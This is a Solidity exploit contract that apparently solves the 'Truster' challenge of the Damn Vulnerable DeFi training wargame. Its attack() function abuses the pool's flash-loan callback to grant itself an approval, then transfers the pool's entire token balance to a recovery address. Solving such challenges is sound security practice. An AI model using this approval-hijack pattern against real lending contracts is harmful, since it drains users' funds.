// SPDX-License-Identifier: MIT

pragma solidity ^0.8.23;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract AttackTruster {
    DamnValuableToken token;
    TrusterLenderPool pool;
    address public recovery;

    constructor(DamnValuableToken token_, TrusterLenderPool pool_, address recovery_) {
        token = token_;
        pool = pool_;
        recovery = recovery_;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
        );
        require(token.transferFrom(address(pool), address(this), amount));
        require(token.transfer(address(recovery), amount));
    }
}